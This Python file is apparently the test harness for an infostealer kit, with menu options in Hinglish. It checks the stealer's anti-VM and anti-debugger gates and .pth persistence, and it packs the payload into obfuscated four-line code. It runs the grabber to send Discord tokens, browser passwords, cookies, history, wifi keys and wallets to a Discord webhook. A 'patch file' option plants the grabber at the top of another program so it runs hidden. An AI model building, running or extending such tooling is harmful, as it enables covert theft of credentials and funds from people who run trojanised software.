"""test.py - injector + grabber ka simple test tool.

Kholo, number dabao, ho gaya. Koi argument yaad rakhne ki zarurat nahi.

    python test.py

Menu:
    1  Doctor        - sab cheezein check karta hai (payload, gates, dll)
    2  Pack test     - injector chalta hai? 4-line code ban raha hai?
    3  Local test    - poora injector + grabber, apne local server pe
    4  Discord test  - poora injector + grabber, tumhare webhook pe
    5  Direct test   - sirf grabber (injector chhod ke), webhook pe
    6  Patch file    - apni app.py me grabber daal do
    0  Exit
"""

from __future__ import annotations

import ctypes
import json
import os
import re
import shutil
import subprocess
import sys
import threading
import time
import zipfile
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent
PAYLOAD = ROOT / "payload" / "harvest.py"
RECEIVED = ROOT / "test_received"

sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "payload"))


# --------------------------------------------------------------------------
# chhote print helpers - saaf output, no emoji mojibake
# --------------------------------------------------------------------------

def line(ch="=", n=66):
    print(ch * n)


def head(text):
    print()
    line("-")
    print(text)
    line("-")


def ok(text):
    print("  [OK]  " + text)


def bad(text):
    print("  [!!]  " + text)


def info(text):
    print("        " + text)


def ask(prompt, default=""):
    suffix = " [" + default + "]" if default else ""
    try:
        got = input(prompt + suffix + ": ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        raise SystemExit(0)
    return got or default


def pause():
    try:
        input("\nEnter dabao menu pe wapas jaane ke liye...")
    except (EOFError, KeyboardInterrupt):
        print()
        raise SystemExit(0)


# --------------------------------------------------------------------------
# 1 - doctor
# --------------------------------------------------------------------------

def _mutex_state():
    """True = mutex already held (grabber kuch nahi karega is run me)."""
    try:
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        k32.CreateMutexW.restype = ctypes.c_void_p
        k32.CreateMutexW.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_wchar_p]
        k32.CloseHandle.restype = ctypes.c_int
        k32.CloseHandle.argtypes = [ctypes.c_void_p]
        handle = k32.CreateMutexW(None, 0, "Global\\hv_boot_lock")
        err = ctypes.get_last_error()
        if handle:
            k32.CloseHandle(handle)
        return err == 183
    except OSError:
        return False


def doctor():
    head("DOCTOR - sab kuch check ho raha hai")
    problems = 0

    # python
    ok("python " + sys.version.split()[0] + "  (" + sys.executable + ")")

    # payload file
    if PAYLOAD.is_file():
        ok("payload mila: payload/harvest.py  (" + str(round(PAYLOAD.stat().st_size / 1024, 1)) + " KB)")
    else:
        bad("payload nahi mila: " + str(PAYLOAD))
        problems += 1

    # compile
    try:
        import ast
        ast.parse(PAYLOAD.read_text(encoding="utf-8"))
        ok("payload syntax clean hai")
    except Exception as exc:
        bad("payload me syntax error: " + repr(exc))
        problems += 1

    # injector
    try:
        import inject
        ok("injector load hua: inject.py")
    except Exception as exc:
        bad("injector load nahi hua: " + repr(exc))
        problems += 1

    # harvest module
    hv = None
    try:
        import harvest as hv
        ok("grabber module load hua: harvest.py")
    except Exception as exc:
        bad("grabber load nahi hua: " + repr(exc))
        problems += 1

    # placeholder
    if hv is not None:
        if "__WEBHOOK__" in str(getattr(hv, "WEBHOOK", "")):
            ok("webhook placeholder khali hai (injector bharta hai) - sahi hai")
        else:
            info("payload me webhook pehle se set hai")

    # admin / system
    if hv is not None:
        try:
            admin = hv._is_admin()
            system = hv._is_system()
            info("admin: " + str(admin) + "   system: " + str(system))
            if not admin:
                info("v20 (naye Chrome/Edge passwords + cookies) band rahenge")
                info("raw DB phir bhi jayenge - ye normal hai, galti nahi")
        except Exception:
            pass

    # hostile gates - yahi sabse zyada test rokta hai
    if hv is not None:
        info("")
        info("gates (jo grabber ko rok sakte hain):")
        try:
            node = __import__("uuid").getnode()
            mac = ":".join("%02x" % ((node >> s) & 255) for s in range(40, -1, -8))
            vm = mac.startswith(hv._VM_MAC)
            info("  mac " + mac + ("   <-- VM RANGE, grabber rukega" if vm else ""))
            if vm:
                problems += 1
        except Exception:
            pass
        try:
            host = (os.environ.get("COMPUTERNAME") or "").lower()
            hit = [m for m in hv._HOST_MARK if m in host]
            info("  computername " + host + ("   <-- '" + hit[0] + "' milega, rukega" if hit else ""))
            if hit:
                problems += 1
        except Exception:
            pass
        try:
            dbg = hv._debugged()
            info("  debugger: " + str(dbg) + ("   <-- rukega" if dbg else ""))
            if dbg:
                problems += 1
        except Exception:
            pass
        try:
            rdp = hv._rdp()
            info("  rdp session: " + str(rdp) + ("   <-- rukega" if rdp else ""))
            if rdp:
                problems += 1
        except Exception:
            pass
        try:
            ram = hv._ram_gb()
            info("  ram " + str(ram) + " GB" + ("   <-- 2 se kam, rukega" if ram and ram < 2 else ""))
            if ram and ram < 2:
                problems += 1
        except Exception:
            pass
        try:
            disk = hv._disk_gb()
            info("  disk " + str(disk) + " GB" + ("   <-- 20 se kam, rukega" if disk and disk < 20 else ""))
            if disk and disk < 20:
                problems += 1
        except Exception:
            pass

        try:
            hostile = hv._hostile()
            if hostile:
                bad("HOSTILE = True  -> grabber chup-chaap return kar jayega")
                info("test ke liye payload/harvest.py me 'if _hostile()' wali line hata do")
                problems += 1
            else:
                ok("HOSTILE = False  -> grabber chalega")
        except Exception:
            pass

    # mutex
    if _mutex_state():
        bad("'Global\\hv_boot_lock' abhi kisi process ne pakda hua hai")
        info("matlab agla run chup-chaap skip ho jayega. us process ko band karo")
        problems += 1
    else:
        ok("mutex free hai (ek boot = ek run wala lock)")

    # winsqlite3
    if Path(r"C:\Windows\System32\winsqlite3.dll").is_file():
        ok("winsqlite3.dll mila (browser DB padhne ke liye)")
    else:
        info("winsqlite3.dll nahi mila - browser DB skip honge, raw copies phir bhi jayengi")

    # .pth
    try:
        import site
        installed = [Path(p) / "zzz_msvcrt_helpers.pth" for p in site.getsitepackages()]
        installed = [p for p in installed if p.is_file()]
        if installed:
            info("")
            bad(".pth persistence installed hai (" + str(len(installed)) + " jagah)")
            info("hatana ho to: python inject.py --unpth")
    except Exception:
        pass

    print()
    if problems == 0:
        ok("sab theek hai - test kar sakte ho")
    else:
        bad(str(problems) + " cheez dhyan maangti hai (upar dekh lo)")
        info("in me se zyada tar cheezein sirf test rok rahi hain, asli target pe nahi hoti")


# --------------------------------------------------------------------------
# 2 - pack test
# --------------------------------------------------------------------------

def pack_test():
    head("PACK TEST - injector se 4-line code banana")

    import inject

    webhook = ask("webhook (khali chhod do to dummy)", "https://discord.com/api/webhooks/000/test")
    app_id = ask("app-id", "test")

    code = inject.pack(webhook, app_id)
    lines = code.splitlines()
    ok("injector chala, " + str(len(lines)) + " line ka code bana")

    if len(lines) != 4:
        bad("4 line hona chahiye tha, mila " + str(len(lines)))
        return

    # asli test: code ko wapas kholo aur compile karo
    namespace = {}
    try:
        exec(lines[1], namespace)
        from base64 import b64decode
        from zlib import decompress
        key = namespace["_K"]
        blob = namespace["_P"]
        raw = bytes(c ^ ord(key[i % len(key)]) for i, c in enumerate(b64decode(blob)))
        source = decompress(raw).decode("utf-8")
    except Exception as exc:
        bad("packed code wapas nahi khula: " + repr(exc))
        return

    ok("packed code wapas khula: " + str(len(source)) + " characters")

    if webhook in source and app_id in source:
        ok("webhook aur app-id sahi tarah andar gaye")
    else:
        bad("webhook/app-id source me nahi mile")

    try:
        compile(source, "<payload>", "exec")
        ok("payload compile hota hai (runtime pe crash nahi hoga)")
    except SyntaxError as exc:
        bad("payload compile nahi hua: " + str(exc))

    if "def start(" in source and "def phase2(" in source:
        ok("'start' aur 'phase2' dono payload me hain")
    else:
        bad("payload adhura hai")

    # boot.py
    boot = ROOT / "boot.py"
    if boot.is_file():
        info("")
        info("boot.py maujood hai (" + str(round(boot.stat().st_size / 1024, 1)) + " KB)")
        info("ye 4-line sample file hai - apni app me paste karne ke liye")

    print()
    ok("injector theek chal raha hai")


# --------------------------------------------------------------------------
# multipart parsing (local receiver ke liye)
# --------------------------------------------------------------------------

def parse_multipart(content_type, body):
    """(payload_dict, [(filename, bytes)]) - Discord jaisa hi format."""
    match = re.search(r"boundary=([^;]+)", content_type or "")
    if not match:
        return {}, []
    boundary = match.group(1).strip().strip('"')
    delimiter = b"--" + boundary.encode()

    meta = {}
    files = []

    for chunk in body.split(delimiter):
        if not chunk or chunk in (b"--\r\n", b"--"):
            continue
        head_part, sep, data = chunk.partition(b"\r\n\r\n")
        if not sep:
            continue
        if data.endswith(b"\r\n"):
            data = data[:-2]

        headers = head_part.decode("latin1")
        name_match = re.search(r'name="([^"]*)"', headers)
        file_match = re.search(r'filename="([^"]*)"', headers)
        if not name_match:
            continue
        name = name_match.group(1)

        if file_match:
            files.append((file_match.group(1), data))
        elif name == "payload_json":
            try:
                meta = json.loads(data.decode("utf-8", "ignore"))
            except ValueError:
                meta = {}

    return meta, files


RESULTS = []


class _Receiver(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers.get("content-length", 0))
            body = self.rfile.read(length)
            meta, files = parse_multipart(self.headers.get("content-type"), body)
            RESULTS.append({"meta": meta, "files": files, "bytes": len(body)})
        except Exception as exc:
            RESULTS.append({"meta": {}, "files": [], "bytes": 0, "error": repr(exc)})
        self.send_response(200)
        self.send_header("content-type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"ok":true}')

    def log_message(self, *args):
        pass


def _write_host(boot_code, seconds):
    """Boot code + process ko zinda rakhne wali line, ek temp host file me."""
    host = Path(os.environ.get("TEMP", ".")) / ("hv_test_host_%d.py" % os.getpid())
    host.write_text(
        boot_code + "\n\n"
        "import time\n"
        "for _ in range(" + str(int(seconds)) + "):\n"
        "    time.sleep(1)\n",
        encoding="utf-8")
    return host


def _show_phase(entry):
    meta = entry["meta"]
    files = entry["files"]
    phase = meta.get("phase")
    label = meta.get("label", "?")

    if phase == 1:
        info("PHASE 1 aaya - " + str(entry["bytes"]) + " bytes")
        for key in ("host", "user", "os", "arch", "admin", "public_ip", "app_id"):
            if key in meta:
                info("  " + key + ": " + str(meta[key]))
        tokens = meta.get("discord") or []
        if isinstance(tokens, list) and tokens:
            info("  discord tokens: " + str(len(tokens)))
            for t in tokens[:3]:
                info("    " + str(t)[:40] + "...")
        else:
            info("  discord tokens: 0 (is PC pe Discord login nahi hai)")
        return

    if phase == 2:
        info("PHASE 2 aaya - " + str(entry["bytes"]) + " bytes, " + str(len(files)) + " file")
        if meta.get("public_ip"):
            info("  public_ip: " + str(meta["public_ip"]))
        for key in ("browsers", "firefox", "wallets", "wifi", "discord"):
            value = meta.get(key)
            if isinstance(value, list):
                info("  " + key + ": " + str(len(value)) + " entries")
        for browser in (meta.get("browsers") or []):
            info("    " + str(browser.get("browser")) + " / " + str(browser.get("profile"))
                 + "  key=" + str(browser.get("key"))
                 + "  logins=" + str(browser.get("logins"))
                 + "  pw=" + str(browser.get("pw_ok", "?"))
                 + "  cookies=" + str(browser.get("cookies"))
                 + "  sealed=" + str(browser.get("sealed"))
                 + "  history=" + str(browser.get("history")))
        for ff in (meta.get("firefox") or []):
            info("    firefox/" + str(ff.get("profile")) + "  key=" + str(ff.get("key"))
                 + "  logins=" + str(ff.get("logins")))
        apps = meta.get("apps") or {}
        if isinstance(apps, dict) and apps.get("copied"):
            info("  apps: " + ", ".join(str(a) for a in apps["copied"]))
        if meta.get("part"):
            info("  part: " + str(meta.get("part")) + " of " + str(meta.get("file")))
        for name, data in files:
            info("  file: " + name + "  (" + str(round(len(data) / 1024, 1)) + " KB)")
        return

    info("packet aaya - " + str(entry["bytes"]) + " bytes (phase pata nahi chala)")


def local_test():
    head("LOCAL TEST - poora injector + grabber, apne PC pe hi")

    info("Discord ki zarurat nahi. Ek chhota local server banta hai,")
    info("grabber wahan data bhejta hai, hum sab dikha dete hain.")
    print()

    if _mutex_state():
        bad("mutex 'Global\\hv_boot_lock' abhi pakda hua hai - test skip ho jayega")
        info("purane grabber process ko band karo (Task Manager) phir dobara")
        return

    import inject

    RESULTS.clear()
    if RECEIVED.is_dir():
        shutil.rmtree(RECEIVED, ignore_errors=True)
    RECEIVED.mkdir(parents=True, exist_ok=True)

    server = HTTPServer(("127.0.0.1", 0), _Receiver)
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    hook = "http://127.0.0.1:" + str(port) + "/api/webhooks/1/test"

    ok("local receiver chalu: " + hook)

    boot_code = inject.pack(hook, "localtest")
    host = _write_host(boot_code, 420)
    ok("packed host file bani: " + host.name)

    info("")
    info("host app chalu ho raha hai (asli app ki tarah)...")
    started = time.time()
    proc = subprocess.Popen(
        [sys.executable, str(host)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        cwd=str(ROOT))

    try:
        deadline = started + 300
        while time.time() < deadline:
            if proc.poll() is not None:
                break
            got_two = any(entry["meta"].get("phase") == 2 for entry in RESULTS)
            if got_two:
                time.sleep(1.0)
                break
            time.sleep(0.25)
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=8)
            except subprocess.TimeoutExpired:
                proc.kill()
        try:
            host.unlink()
        except OSError:
            pass

    elapsed = round(time.time() - started, 1)
    stderr = b""
    try:
        stderr = proc.stderr.read() or b""
    except Exception:
        pass
    server.shutdown()

    print()
    line("-")
    print("RESULT - " + str(len(RESULTS)) + " packet, " + str(elapsed) + " second")
    line("-")

    if not RESULTS:
        bad("kuch bhi nahi aaya")
        info("sabse pehle option 1 (Doctor) chalao - wahan pata chal jayega kya rok raha hai")
        if stderr:
            info("")
            info("host app ka error:")
            for raw in stderr.decode("utf-8", "ignore").splitlines()[-8:]:
                info("  " + raw)
        return

    zip_blob = None
    for entry in RESULTS:
        _show_phase(entry)
        for name, data in entry["files"]:
            target = RECEIVED / name
            try:
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(data)
                if name.lower().endswith(".zip"):
                    zip_blob = target
            except OSError:
                pass

    if zip_blob is not None:
        try:
            out = RECEIVED / "unzipped"
            with zipfile.ZipFile(zip_blob) as archive:
                archive.extractall(out)
                names = archive.namelist()
            info("")
            ok("zip khul gaya: " + str(len(names)) + " entries")
            tops = {}
            for name in names:
                if "/" in name:
                    top = name.split("/")[0] + "/"
                else:
                    top = "(root)"
                tops[top] = tops.get(top, 0) + 1
            for top, count in sorted(tops.items()):
                info("  " + top + "  (" + str(count) + " file)")
        except Exception as exc:
            bad("zip nahi khula: " + repr(exc))

    info("")
    info("sab kuch yahan save hua: " + str(RECEIVED))
    info("andar jaake dekh lo - logins.txt, cookies.txt, history.txt, report.json")

    print()
    if any(entry["meta"].get("phase") == 2 for entry in RESULTS):
        ok("TEST PASS - injector chala, grabber chala, data pahuncha")
    else:
        bad("phase 2 nahi aaya - sirf phase 1 pahuncha")
        info("Doctor (option 1) chalao, aur 'hostile' wali line dekho")


# --------------------------------------------------------------------------
# 4 - discord test (packed, real webhook)
# --------------------------------------------------------------------------

def real_test():
    head("DISCORD TEST - poora injector + grabber, tumhare webhook pe")

    if _mutex_state():
        bad("mutex 'Global\\hv_boot_lock' abhi pakda hua hai")
        info("purane grabber process ko band karo phir dobara")
        return

    import inject

    webhook = ask("discord webhook URL")
    if not webhook:
        bad("webhook ke bina test nahi hoga")
        return
    if "discord.com/api/webhooks" not in webhook:
        info("ye Discord webhook jaisa nahi lag raha, phir bhi try kar raha hoon")

    app_id = ask("app-id (jo Discord message pe dikhega)", "test")
    boot_code = inject.pack(webhook, app_id)
    host = _write_host(boot_code, 420)

    ok("code pack ho gaya")
    ok("host app chalu ho raha hai")

    print()
    info("Do message aayenge:")
    info("  1) turant  - PC ki detail + Discord tokens")
    info("  2) thodi der me - zip file (browser data, wifi, screen, apps)")
    info("")
    info("Jab dono dikh jayein, Enter dabao. Us se pehle nahi.")
    info("(phase 2 me 10-60 second lag sakte hain, browser DB padhne me time lagta hai)")

    proc = subprocess.Popen(
        [sys.executable, str(host)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        cwd=str(ROOT))

    try:
        input("\n>>> Discord check kar lo, phir Enter: ")
    except (EOFError, KeyboardInterrupt):
        print()
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=8)
            except subprocess.TimeoutExpired:
                proc.kill()
        stderr = b""
        try:
            stderr = proc.stderr.read() or b""
        except Exception:
            pass
        try:
            host.unlink()
        except OSError:
            pass

    print()
    if stderr.strip():
        info("host app ne kuch error diya:")
        for raw in stderr.decode("utf-8", "ignore").splitlines()[-8:]:
            info("  " + raw)

    ok("agar Discord pe message aa gaya - injector theek hai")
    info("nahi aaya to option 1 (Doctor) chalao, ya option 5 (Direct test)")
    info("Direct test batata hai ki problem grabber me hai ya packing me")


# --------------------------------------------------------------------------
# 5 - direct test (no injector, in-process)
# --------------------------------------------------------------------------

def direct_test():
    head("DIRECT TEST - sirf grabber, injector ke bina")

    info("Ye sabse saaf test hai. Code pack nahi hota.")
    info("Isliye pata chal jata hai: dikkat grabber me hai ya packing me.")
    print()

    webhook = ask("discord webhook URL")
    if not webhook:
        bad("webhook ke bina test nahi hoga")
        return

    import harvest

    harvest.WEBHOOK = webhook
    harvest.APP_ID = "direct"

    # ---- phase 1 ----
    info("")
    info("phase 1 chal raha hai...")
    started = time.time()
    try:
        first = harvest.phase1()
        first["phase"] = 1
        first["label"] = "direct"
        sent_one = harvest._send(webhook, first)
    except Exception as exc:
        bad("phase 1 crash: " + repr(exc))
        return

    if sent_one:
        ok("phase 1 Discord pe pahunch gaya (" + str(round(time.time() - started, 1)) + "s)")
        info("  host: " + str(first.get("host")) + "   user: " + str(first.get("user")))
        info("  admin: " + str(first.get("admin")))
        info("  discord tokens: " + str(len(first.get("discord") or [])))
    else:
        bad("phase 1 bheja nahi gaya - webhook galat hai ya net nahi hai")
        info("Discord pe webhook delete ho gaya ho to 404 aata hai")
        return

    # ---- phase 2 ----
    info("")
    info("phase 2 chal raha hai (browser DB, wifi, screen, zip)...")
    info("10-60 second lag sakte hain. band mat karo.")
    started = time.time()
    try:
        second = harvest.phase2()
        second["phase"] = 2
        second["label"] = "direct"
        archive = harvest._archive()
        blob = archive.read_bytes()
        harvest._ship(webhook, second, [("direct.zip", blob)])
    except Exception as exc:
        bad("phase 2 crash: " + repr(exc))
        return

    took = round(time.time() - started, 1)
    ok("phase 2 chal gaya (" + str(took) + "s), zip " + str(round(len(blob) / 1048576, 2)) + " MB")

    for browser in (second.get("browsers") or []):
        info("  " + str(browser.get("browser")) + "/" + str(browser.get("profile"))
             + "  key=" + str(browser.get("key"))
             + "  logins=" + str(browser.get("logins"))
             + "  cookies=" + str(browser.get("cookies"))
             + "  sealed=" + str(browser.get("sealed"))
             + "  history=" + str(browser.get("history")))
    for ff in (second.get("firefox") or []):
        info("  firefox/" + str(ff.get("profile")) + "  key=" + str(ff.get("key"))
             + "  logins=" + str(ff.get("logins")))
    info("  wifi: " + str(len(second.get("wifi") or [])) + " networks")
    info("  wallets: " + str(len(second.get("wallets") or [])))

    archive.unlink(missing_ok=True)
    try:
        harvest.shutil.rmtree(harvest._STAGE, ignore_errors=True)
    except Exception:
        pass

    print()
    ok("DONO phase bheje gaye - Discord me zip dekho")
    info("zip 7.5 MB se bada hua to .001 .002 parts me aayega")


# --------------------------------------------------------------------------
# 6 - patch a file
# --------------------------------------------------------------------------

def patch_test():
    head("PATCH FILE - apni app me grabber daal do")

    info("File ka poora path do. Uske sabse upar 4 line add ho jayengi.")
    info("Baaki code waisa hi rahega.")
    print()

    target = ask("file ka path (jaise C:\\Users\\SOURABH\\app.py)")
    if not target:
        bad("path nahi diya")
        return

    path = Path(target.strip('"'))
    if not path.is_file():
        bad("file nahi mili: " + str(path))
        return

    webhook = ask("discord webhook URL")
    if not webhook:
        bad("webhook ke bina nahi hoga")
        return

    app_id = ask("app-id", path.stem)
    import inject

    backup = path.with_suffix(path.suffix + ".backup")
    if not backup.is_file():
        shutil.copy2(path, backup)
        info("backup ban gaya: " + backup.name)
    else:
        info("backup pehle se hai: " + backup.name)

    try:
        inject.patch_file(path, webhook, app_id)
    except SystemExit as exc:
        bad(str(exc))
        return
    except Exception as exc:
        bad("patch fail: " + repr(exc))
        return

    ok("patch ho gaya: " + str(path))
    info("ab wo file normal chalao - grabber sath me chalega")
    info("wapas karna ho to: " + backup.name + " ko copy karke original naam de do")


# --------------------------------------------------------------------------
# menu
# --------------------------------------------------------------------------

MENU = [
    ("1", "Doctor        - sab cheezein check karo (yahan se shuru karo)", doctor),
    ("2", "Pack test     - injector se 4-line code ban raha hai?", pack_test),
    ("3", "Local test    - poora injector + grabber, local server pe", local_test),
    ("4", "Discord test  - poora injector + grabber, tumhare webhook pe", real_test),
    ("5", "Direct test   - sirf grabber, webhook pe (debug ke liye)", direct_test),
    ("6", "Patch file    - apni app.py me grabber daalo", patch_test),
    ("0", "Exit", None),
]


def menu():
    while True:
        print()
        line()
        print("  HARVESTER TEST TOOL")
        line()
        for key, text, _ in MENU:
            print("  " + key + "   " + text)
        print()
        choice = ask("number chuno", "1")

        for key, _, func in MENU:
            if key == choice:
                if func is None:
                    print()
                    ok("band. bench garam hai, jab chaho wapas aao.")
                    return
                try:
                    func()
                except SystemExit:
                    raise
                except KeyboardInterrupt:
                    print()
                except Exception as exc:
                    print()
                    bad("kuch galat ho gaya: " + repr(exc))
                pause()
                break
        else:
            bad("'" + choice + "' koi option nahi hai")


def main():
    # Windows console me Hindi/emoji jaisa kuch nahi hai, par safety ke liye
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

    print()
    print("  ye tool tumhari apni machine pe chalta hai, tumhare webhook pe")
    print("  payload: payload/harvest.py")

    if not PAYLOAD.is_file():
        print()
        bad("payload/harvest.py nahi mila - is folder me chalao:")
        info(str(ROOT))
        return 1

    menu()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
